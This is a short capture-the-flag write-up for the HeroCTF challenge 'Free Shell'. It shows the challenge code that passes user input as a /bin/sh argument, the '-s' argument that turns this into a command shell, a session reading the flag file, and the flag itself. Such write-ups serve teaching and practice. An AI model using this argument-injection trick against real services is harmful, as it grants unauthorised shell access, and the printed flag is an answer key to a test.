# Free Shell

### Category

Misc

### Description

Your goal is to find a valid solution to acquire a shell on the remote server.

Once you have discovered a valid solution locally, you can test it on:<br>
`nc misc.heroctf.fr 7000`

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Files

- [free_shell.py](free_shell.py)

### Write Up

You need to find the correct `/bin/sh` parameter that will allows you to get a shell.

```python
command = [
    "/bin/sh",
    input("Choose param: "),
    os.urandom(32).hex(),
    os.urandom(32).hex(),
    os.urandom(32).hex()
]
subprocess.run(command)
```

You can use the `-s` flag, for `Read STDIN`.

```
$ nc misc.heroctf.fr 7000
Welcome to the free shell service!
Your goal is to obtain a shell.
Choose param: -s
ls
entrypoint.sh
flag_5MZlXDu0VEMNaXTQsiDqzpaPm5r5xm1d.txt
free_shell.py
cat flag_*
Hero{533m5_11k3_y0u_f0und_7h3_c0223c7_p424m3732}
```

### Flag

- Hero{533m5_11k3_y0u_f0und_7h3_c0223c7_p424m3732}